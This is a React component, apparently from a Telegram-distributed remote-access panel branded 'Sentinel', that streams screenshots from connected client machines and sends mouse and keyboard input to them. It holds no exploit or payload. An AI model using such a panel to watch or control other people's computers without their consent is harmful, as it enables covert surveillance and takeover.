// t.me/SentinelLinks

"use client"

import type React from "react"
import { useEffect, useRef, useState, useCallback } from "react"
import { WifiOff, Maximize2, X, Play, Square, AlertCircle, RefreshCw, Mouse, Keyboard, Monitor } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import type { User } from "@/app/page"
import { toast } from "sonner"
import ReactDOM from "react-dom"

interface RemoteDesktopProps {
  selectedUser: User | null
}

interface MonitorInfo {
  id: string
  name: string
  width: number
  height: number
  isPrimary: boolean
}

export function RemoteDesktop({ selectedUser }: RemoteDesktopProps) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const floatingRef = useRef<HTMLDivElement>(null)
  const [isConnected, setIsConnected] = useState(false)
  const [isStreaming, setIsStreaming] = useState(false)
  const [fps, setFps] = useState("10")
  const [isFloating, setIsFloating] = useState(false)
  const [position, setPosition] = useState({ x: 50, y: 50 })
  const [isDragging, setIsDragging] = useState(false)
  const [dragStart, setDragStart] = useState({ x: 0, y: 0 })
  const [controlEnabled, setControlEnabled] = useState(false)
  const [screenSize, setScreenSize] = useState({ width: 1920, height: 1080 })
  const streamingRef = useRef(false)

  const [monitors, setMonitors] = useState<MonitorInfo[]>([])
  const [selectedMonitor, setSelectedMonitor] = useState<string>("0")
  const [loadingMonitors, setLoadingMonitors] = useState(false)

  const fetchMonitors = useCallback(async () => {
    if (!selectedUser || selectedUser.status !== "online") return

    setLoadingMonitors(true)
    try {
      const response = await fetch(`/api/screen/monitors?clientId=${selectedUser.id}`)
      if (response.ok) {
        const data = await response.json()
        if (data.monitors && Array.isArray(data.monitors)) {
          setMonitors(data.monitors)
          // Auto-select primary monitor or first one
          const primary = data.monitors.find((m: MonitorInfo) => m.isPrimary)
          if (primary) {
            setSelectedMonitor(primary.id)
          } else if (data.monitors.length > 0) {
            setSelectedMonitor(data.monitors[0].id)
          }
        }
      }
    } catch (error) {
      console.error("Failed to fetch monitors:", error)
      // Fallback: default monitors
      setMonitors([{ id: "0", name: "Монитор 1", width: 1920, height: 1080, isPrimary: true }])
      setSelectedMonitor("0")
    } finally {
      setLoadingMonitors(false)
    }
  }, [selectedUser])

  // Fetch monitors when user is selected
  useEffect(() => {
    if (selectedUser?.status === "online") {
      fetchMonitors()
    } else {
      setMonitors([])
      setSelectedMonitor("0")
    }
  }, [selectedUser, fetchMonitors])

  const fetchScreenshot = useCallback(async () => {
    if (!selectedUser || !streamingRef.current) return

// t.me/SentinelLinks
    try {
      const response = await fetch(`/api/screen?clientId=${selectedUser.id}&monitor=${selectedMonitor}`)
      if (response.ok) {
        const data = await response.json()
        if (data.data) {
          const canvas = canvasRef.current
          if (canvas) {
            const ctx = canvas.getContext("2d")
            const img = new Image()
            img.crossOrigin = "anonymous"
            img.onload = () => {
              setScreenSize({ width: img.width, height: img.height })
              ctx?.drawImage(img, 0, 0, canvas.width, canvas.height)
            }
            img.src = `data:image/jpeg;base64,${data.data}`
          }
        }
      }
    } catch (error) {
      console.error("Screenshot fetch error:", error)
    }
  }, [selectedUser, selectedMonitor])

  useEffect(() => {
    streamingRef.current = isStreaming
  }, [isStreaming])

  useEffect(() => {
    if (!isStreaming || !selectedUser) return

    const interval = setInterval(fetchScreenshot, 1000 / Number.parseInt(fps))

    return () => clearInterval(interval)
  }, [isStreaming, selectedUser, fps, fetchScreenshot])

  useEffect(() => {
    if (selectedUser?.status === "online") {
      setIsConnected(true)
    } else {
      setIsConnected(false)
      setIsStreaming(false)
    }
  }, [selectedUser])

  const sendMouseInput = async (action: string, x: number, y: number, button?: number) => {
    if (!selectedUser || !controlEnabled) return

    const canvas = canvasRef.current
    if (!canvas) return

    const scaleX = screenSize.width / canvas.width
    const scaleY = screenSize.height / canvas.height

    try {
      await fetch("/api/input", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          clientId: selectedUser.id,
          type: "mouse",
          monitor: selectedMonitor,
          data: {
            action,
            x: Math.round(x * scaleX),
            y: Math.round(y * scaleY),
            button: button || 0,
          },
        }),
      })
    } catch (error) {
      console.error("Mouse input error:", error)
    }
  }

  const sendKeyboardInput = async (key: string, keyCode: number, action: "down" | "up") => {
    if (!selectedUser || !controlEnabled) return

    try {
      await fetch("/api/input", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          clientId: selectedUser.id,
          type: "keyboard",
          data: { key, keyCode, action },
        }),
      })
    } catch (error) {
      console.error("Keyboard input error:", error)
    }
  }

  const handleCanvasMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!controlEnabled) return
    const rect = e.currentTarget.getBoundingClientRect()
    const x = e.clientX - rect.left
    const y = e.clientY - rect.top
    sendMouseInput("move", x, y)
  }

  const handleCanvasMouseDown = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!controlEnabled) return
    const rect = e.currentTarget.getBoundingClientRect()
    const x = e.clientX - rect.left
    const y = e.clientY - rect.top
    sendMouseInput("down", x, y, e.button)
  }

  const handleCanvasMouseUp = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!controlEnabled) return
    const rect = e.currentTarget.getBoundingClientRect()
    const x = e.clientX - rect.left
    const y = e.clientY - rect.top
    sendMouseInput("up", x, y, e.button)
  }

// t.me/SentinelLinks
  const handleCanvasClick = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!controlEnabled) return
    const rect = e.currentTarget.getBoundingClientRect()
    const x = e.clientX - rect.left
    const y = e.clientY - rect.top
    sendMouseInput("click", x, y, e.button)
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (!controlEnabled) return
    e.preventDefault()
    sendKeyboardInput(e.key, e.keyCode, "down")
  }

  const handleKeyUp = (e: React.KeyboardEvent) => {
    if (!controlEnabled) return
    e.preventDefault()
    sendKeyboardInput(e.key, e.keyCode, "up")
  }

  const handleMouseDown = (e: React.MouseEvent) => {
    if (!isFloating) return
    setIsDragging(true)
    setDragStart({
      x: e.clientX - position.x,
      y: e.clientY - position.y,
    })
  }

  const handleMouseMove = (e: MouseEvent) => {
    if (!isDragging) return
    setPosition({
      x: e.clientX - dragStart.x,
      y: e.clientY - dragStart.y,
    })
  }

  const handleMouseUp = () => {
    setIsDragging(false)
  }

  useEffect(() => {
    if (isDragging) {
      window.addEventListener("mousemove", handleMouseMove)
      window.addEventListener("mouseup", handleMouseUp)
      return () => {
        window.removeEventListener("mousemove", handleMouseMove)
        window.removeEventListener("mouseup", handleMouseUp)
      }
    }
  }, [isDragging, dragStart])

  const toggleFloating = () => {
    setIsFloating(!isFloating)
  }

  const toggleStreaming = () => {
    if (!isStreaming) {
      setIsStreaming(true)
      streamingRef.current = true
      toast.success("Трансляция запущена")
    } else {
      setIsStreaming(false)
      streamingRef.current = false
      toast.info("Трансляция остановлена")
    }
  }

// t.me/SentinelLinks
  const toggleControl = () => {
    setControlEnabled(!controlEnabled)
    if (!controlEnabled) {
      toast.success("Управление включено - кликните на экран для фокуса")
    } else {
      toast.info("Управление отключено")
    }
  }

  const desktopContent = (
    <div className="relative rounded-lg overflow-hidden border bg-card shadow-lg">
      <div className="absolute top-3 left-3 z-10 flex gap-2 flex-wrap">
        <Button
          size="sm"
          variant={isStreaming ? "destructive" : "default"}
          onClick={toggleStreaming}
          className="gap-2 h-8 px-3"
        >
          {isStreaming ? (
            <>
              <Square className="w-3 h-3 fill-current" />
              <span className="text-xs font-medium">Stop</span>
            </>
          ) : (
            <>
              <Play className="w-3 h-3 fill-current" />
              <span className="text-xs font-medium">Start</span>
            </>
          )}
        </Button>

        <Select value={selectedMonitor} onValueChange={setSelectedMonitor} disabled={isStreaming}>
          <SelectTrigger className="w-[140px] h-8 bg-background/80 backdrop-blur-sm">
            <Monitor className="w-3 h-3 mr-2" />
            <SelectValue placeholder={loadingMonitors ? "Загрузка..." : "Монитор"} />
          </SelectTrigger>
          <SelectContent>
            {monitors.length === 0 ? (
              <SelectItem value="0">Монитор 1</SelectItem>
            ) : (
              monitors.map((monitor) => (
                <SelectItem key={monitor.id} value={monitor.id}>
                  {monitor.name} {monitor.isPrimary ? "(Основной)" : ""}
                </SelectItem>
              ))
            )}
          </SelectContent>
        </Select>

        <Select value={fps} onValueChange={setFps}>
          <SelectTrigger className="w-[100px] h-8">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="5">5 FPS</SelectItem>
            <SelectItem value="10">10 FPS</SelectItem>
            <SelectItem value="15">15 FPS</SelectItem>
            <SelectItem value="30">30 FPS</SelectItem>
          </SelectContent>
        </Select>
        <Button size="sm" variant="outline" onClick={fetchScreenshot} className="h-8 px-3 bg-transparent">
          <RefreshCw className="w-3 h-3" />
        </Button>
        <Button
          size="sm"
          variant="outline"
          onClick={fetchMonitors}
          className="h-8 px-3 bg-transparent"
          disabled={loadingMonitors}
        >
          <Monitor className={`w-3 h-3 ${loadingMonitors ? "animate-pulse" : ""}`} />
        </Button>
        <Button
          size="sm"
          variant={controlEnabled ? "default" : "outline"}
          onClick={toggleControl}
          className="h-8 px-3 gap-1"
        >
          <Mouse className="w-3 h-3" />
          <Keyboard className="w-3 h-3" />
        </Button>
      </div>
      <div className="absolute top-3 right-3 z-10">
        <Button size="icon" variant="secondary" className="h-8 w-8" onClick={toggleFloating}>
          {isFloating ? <X className="w-3 h-3" /> : <Maximize2 className="w-3 h-3" />}
        </Button>
      </div>
      <canvas
        ref={canvasRef}
        width={1200}
        height={700}
        className={`w-full h-auto bg-black ${controlEnabled ? "cursor-crosshair" : "cursor-default"}`}
        tabIndex={0}
        onMouseMove={handleCanvasMouseMove}
        onMouseDown={handleCanvasMouseDown}
        onMouseUp={handleCanvasMouseUp}
        onClick={handleCanvasClick}
        onKeyDown={handleKeyDown}
        onKeyUp={handleKeyUp}
        onContextMenu={(e) => e.preventDefault()}
      />
      <div className="absolute bottom-3 right-3 px-3 py-1.5 rounded-md bg-background/80 backdrop-blur-sm border text-xs font-mono flex items-center gap-2">
        {isStreaming ? (
          <>
            <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
            <span className="text-green-600 dark:text-green-400 font-semibold">LIVE</span>
          </>
        ) : (
          <>
            <span className="w-2 h-2 rounded-full bg-muted-foreground" />
            <span className="text-muted-foreground">PAUSED</span>
          </>
        )}
        {controlEnabled && (
          <>
            <span className="text-border">•</span>
            <span className="text-blue-500 font-semibold">CONTROL</span>
          </>
        )}
        <span className="text-border">•</span>
        <Monitor className="w-3 h-3" />
        <span>{monitors.find((m) => m.id === selectedMonitor)?.name || `Монитор ${Number(selectedMonitor) + 1}`}</span>
        <span className="text-border">•</span>
        <span className="text-muted-foreground">{selectedUser?.name || "N/A"}</span>
        <span className="text-border">•</span>
        <span className="text-muted-foreground">{fps} FPS</span>
      </div>
    </div>
  )

  if (isFloating && selectedUser) {
    return (
      <>
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center">
            <div className="w-16 h-16 rounded-lg bg-muted flex items-center justify-center mx-auto mb-4">
              <Maximize2 className="w-8 h-8 text-muted-foreground" />
            </div>
            <h3 className="text-lg font-semibold mb-1">Floating Mode Active</h3>
            <p className="text-sm text-muted-foreground">Desktop is displayed in floating window</p>
          </div>
        </div>
        {typeof document !== "undefined" &&
          ReactDOM.createPortal(
            <div
              ref={floatingRef}
              className="fixed z-[9999] bg-background border rounded-lg shadow-2xl"
              style={{
                left: `${position.x}px`,
                top: `${position.y}px`,
                width: "600px",
                cursor: isDragging ? "grabbing" : "grab",
              }}
            >
              <div
                className="px-3 py-2 bg-muted border-b rounded-t-lg cursor-grab active:cursor-grabbing"
                onMouseDown={handleMouseDown}
              >
                <p className="text-xs font-semibold text-center">
                  {selectedUser.name} - {monitors.find((m) => m.id === selectedMonitor)?.name || "Floating Mode"}
                </p>
              </div>
              {desktopContent}
            </div>,
            document.body,
          )}
      </>
    )
  }

  if (!selectedUser) {
    return (
      <div className="flex-1 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 rounded-lg bg-muted flex items-center justify-center mx-auto mb-4">
            <WifiOff className="w-8 h-8 text-muted-foreground" />
          </div>
          <h3 className="text-lg font-semibold mb-1">No Connection</h3>
          <p className="text-sm text-muted-foreground">Select a device from the sidebar</p>
        </div>
      </div>
    )
  }

  if (selectedUser.status !== "online") {
    return (
      <div className="flex-1 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 rounded-lg bg-destructive/10 flex items-center justify-center mx-auto mb-4">
            <AlertCircle className="w-8 h-8 text-destructive" />
          </div>
          <h3 className="text-lg font-semibold mb-1">Device Unavailable</h3>
          <p className="text-sm text-muted-foreground">{selectedUser.name} is offline</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex-1 p-6 overflow-auto">
      <div className="max-w-7xl mx-auto">{desktopContent}</div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
